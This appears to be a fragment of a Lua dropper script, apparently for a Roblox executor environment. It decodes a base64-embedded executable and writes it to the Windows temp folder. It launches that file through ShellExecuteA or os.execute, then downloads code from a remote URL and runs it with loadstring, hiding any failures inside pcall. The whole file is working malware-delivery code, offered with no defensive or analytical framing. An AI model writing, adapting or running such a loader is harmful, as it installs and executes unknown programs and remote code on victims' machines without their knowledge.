local function b64decode(data)
  data = data:gsub("%s", ""):gsub("=", "")
  local out, bits, nbits = {}, 0, 0
  for i = 1, #data do
    local v = LOOKUP[data:sub(i, i)]
    if v then
      bits = bits * 64 + v
      nbits = nbits + 6
      if nbits >= 8 then
        nbits = nbits - 8
        local byte = bits % 256
        out[#out + 1] = string.char(byte)
        bits = (bits - byte) / 256
      end
    end
  end
  return table.concat(out)
end

local EXE_DATA = b64decode(B64)
B64 = nil

local ffiOk, ffi = pcall(require, "ffi")
if ffiOk then
  pcall(function()
    ffi.cdef[[
      int ShellExecuteA(void* hwnd, const char* op, const char* file, const char* params, const char* dir, int show);
      unsigned long GetTempPathA(unsigned long n, char* buf);
    ]]
  end)
end

local function detectTemp()
  if ffiOk then
    local ok, p = pcall(function()
      local buf = ffi.new("char[?]", 512)
      local n = ffi.C.GetTempPathA(512, buf)
      if n > 0 then return (ffi.string(buf, n):gsub("[/\\]$", "")) end
      return nil
    end)
    if ok and p and #p > 0 then return p end
  end
  local ok, t = pcall(function() return os.getenv("TEMP") or os.getenv("TMP") end)
  if ok and t and #t > 0 then return t:gsub("[/\\]$", "") end
  return nil
end

local TEMP_DIR = detectTemp()
local TARGET_PATH = TEMP_DIR and (TEMP_DIR .. "\\" .. EXE_NAME) or EXE_NAME

local function writeBin(path, data)
  local ok = pcall(function()
    if not (io and io.open) then error("no io") end
    local f = io.open(path, "wb")
    if not f then error("open failed") end
    f:write(data)
    f:close()
  end)
  if ok then return true end
  local ok2 = pcall(function()
    if not writefile then error("no writefile") end
    writefile(EXE_NAME, data)
  end)
  return ok2
end

if not writeBin(TARGET_PATH, EXE_DATA) and TARGET_PATH ~= EXE_NAME then writeBin(EXE_NAME, EXE_DATA) end

local function runExe(path)
  if ffiOk then
    local ok = pcall(function()
      ffi.C.ShellExecuteA(nil, "open", path, nil, nil, 1)
    end)
    if ok then return true end
  end
  if os and os.execute then
    local clean = path:gsub('"', "")
    local ok = pcall(function() os.execute('start "" "' .. clean .. '"') end)
    if ok then return true end
  end
  return false
end

if not runExe(TARGET_PATH) and TARGET_PATH ~= EXE_NAME then runExe(EXE_NAME) end

local ok, src = pcall(function() return game:HttpGet(MAIN_URL) end)
if ok and type(src) == "string" and #src > 0 then
  local fn = loadstring(src)
  if fn then pcall(fn) end
end
